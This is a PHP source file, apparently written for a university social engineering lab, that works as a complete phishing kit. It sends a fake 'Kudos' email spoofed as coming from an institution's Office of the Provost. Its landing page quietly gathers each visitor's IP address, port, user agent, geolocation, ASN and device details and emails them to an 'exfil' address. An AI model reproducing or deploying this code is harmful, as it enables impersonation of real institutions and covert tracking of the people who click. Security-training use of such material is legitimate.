<?php
// Author: Ian Stroszeck, with support and ideas from Andrew Afonso
// Description: A social engineering lab. This sends the attack email, and is the landing page for the attack as well.
// https://people.rit.edu/ids1044/?secretCODE=1&email=[INSERT EMAIL HERE]&name=[INSERT NAME HERE]
// Just for testing
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

// Secret parameter for activiating the sending of the email. 1=send phishing email. 2=target landed and data recv
$sendIT = intval($_REQUEST['secretCODE']);
$emailmessage = $_REQUEST['email'];
$name = $_REQUEST['name'];

//$targetEmail = person the Email will be sent to. $exfilEmail is the address that some data will be reported back to.
//$targetEmail = "[INSERT HERE]";
$targetEmail = $emailmessage;
$exfilEmail = "[INSERT HERE]";


// Sets Email Configuration
$to = $targetEmail;
$subject = "You've Been Given a Kudos!";
$from = "provost@rit.edu";
$fromName = "Office of the Provost";


/* 
 * Custom PHP function to send an email with multiple attachments 
 * $to Recipient email address 
 * $subject Subject of the email 
 * $message Mail body content 
 * $senderEmail Sender email address 
 * $senderName Sender name 
 * $files Files to attach with the email 
 * From Codexworld
 */ 
 
function multi_attach_mail($to, $subject, $message, $senderEmail, $senderName, $files = array()){ 
 
    $from = $senderName." <".$senderEmail.">";  
    $headers = "From: $from";  // Will create format-> From: Ellen Granberg <provost@rit.edu>

    // Boundary  
    $semi_rand = md5(time());  
    $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";  
    
	// Headers for attachment  
    $headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\"";
 
    // Multipart boundary  
    $message = "--{$mime_boundary}\n" . "Content-Type: text/html; charset=\"UTF-8\"\n" . 
    "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n";  

    // Send email 
    $mail = @mail($to, $subject, $message, $headers, $returnpath);  
     
    // Return true, if email sent, otherwise return false 
    if($mail){ 
        return true; 
    }else{ 
		$e = new \Exception;
		var_dump($e->getTraceAsString());
        return false; 

    } 
}

// Constructs and sends the kudos email
if($sendIT == 1){
	
	// Get images
	$files = array( 
		'images/Candids_0022.jpg', 
		'images/facebook2x.png',
		'images/instagram2x.png',
		'images/linkedin2x.png',
		'images/RIT_logo.png',
		'images/twitter2x.png', 
	); 
	
	// Get text content from file 
	$email_body = file_get_contents("emailContent01.html");
	$email_body = str_replace('%%NAME%%', $name, $email_body);
	// add the name of the person clicked on to the link clicked
	$link = "http://people.rit.edu/ids1044/index.php?name=" . $name;
	$email_body = str_replace('%%LINK%%', $link, $email_body);
	// Call HTML mail function and pass the required arguments -> End result: sends message
	$sendEmail = multi_attach_mail($to, $subject, $email_body, $from, $fromName, $files); 
	 
	// Email sending status 
	if($sendEmail){ 
		echo 'The email has sent successfully.'; 
	}else{ 
		echo 'Mail sending failed!'; 
	}

}else{
	// Sets time from client's POV
	$now = date("M d, Y, h:i A");

	// Client data to send home
	$clientIPOne = $_SERVER['REMOTE_ADDR'];
	$reqTime = $_SERVER['REQUEST_TIME'];
	$remotePort = $_SERVER['REMOTE_PORT'];
	$userAgent = $_SERVER['HTTP_USER_AGENT'];
	$timeZone = date_default_timezone_get();
	
	// Geo-locate IP Address
	$ip_loc_api = "http://api.ipstack.com/" . $clientIPOne . "?access_key=[INSERT HERE]" . "&format=1";
	
	// ASN Information
	$ip_asn = "https://api.hackertarget.com/aslookup/?q=" . $clientIPOne;
	
	// Userstack Information
	$ua_clean = urlencode($userAgent);
	$userstack_api = "http://api.userstack.com/detect?access_key=[INSERT HERE]&ua=" . $ua_clean . "&fields=type,os.name,os.family_vendor,device.is_mobile_device,device.type,device.brand,device.name,browser.name,browser.version,browser.engine,crawler";
	
	// curl init
	$ch = curl_init();
	
	// set URL and other appropriate options for ip locate
	curl_setopt($ch, CURLOPT_URL, $ip_loc_api);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	// Curl it
	$ip_results = curl_exec($ch);
	
	// set URL and other appropriate options for ASN
	curl_setopt($ch, CURLOPT_URL, $ip_asn);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	// Curl it
	$ip_asn_info = curl_exec($ch);
	
	
	// set URL and other appropriate options for userstack
	curl_setopt($ch, CURLOPT_URL, $userstack_api);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	// Curl it
	$userstack_results = curl_exec($ch);
	
	// close cURL resource, and free up system resources
	curl_close($ch);
	
	// Send notification of exploit success and gathered data.
		$email_subject = "Social Engineering Lab Data Report";
		$headers = "From: no-reply@rick.rit.edu \r\n";
		$headers .= "Reply-To: no-reply@rick.rit.edu  \r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=utf-8\r\n";
		$email_body = "<html><body>";
		$email_body .= "<h1>Webpage Accessed</h1>";
		$email_body .= "<h2>Client name<h2>";
		$email_body .= $name . "<br>";
		$email_body .= "<h3>Client IP</h3>";
        $email_body .=  $clientIPOne . "<br>";
		## Added Userstack info
		$email_body .= "<h3>Userstack Info</h3>";
		$email_body .= "<h4>Browser, OS, Device, Crawler, etc.</h4>";
        $email_body .=  $userstack_results . "<br><br>";
		//
		## Added ip results & ASN info
		$email_body .= "<h3>IP Location Information</h3>";
		$email_body .= $ip_results . "<br>";
		//
		$email_body .= "<h4>IP ASN Information</h4>";
		$email_body .= $ip_asn_info . "<br>";
        $email_body .= "<h4>Time of Access</h4>";
        $email_body .=  "Request Time (system): " . $reqTime . "<br>";
        $email_body .=  "Request Time (readable): " . $now . "<br>";
        $email_body .=  "Time Zone: " . $timeZone . "<br>";
        $email_body .= "<h4>Other Client Info</h4>";
        $email_body .=  "User Agent: " . $userAgent . "<br>";
        $email_body .=  "Remote Port: " . $remotePort . "<br>";

        
        $email_body .= "</body></html>";
        
        // Send the email.
        mail($exfilEmail,$email_subject,$email_body,$headers);
        
        header('Refresh: 0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    }
?>
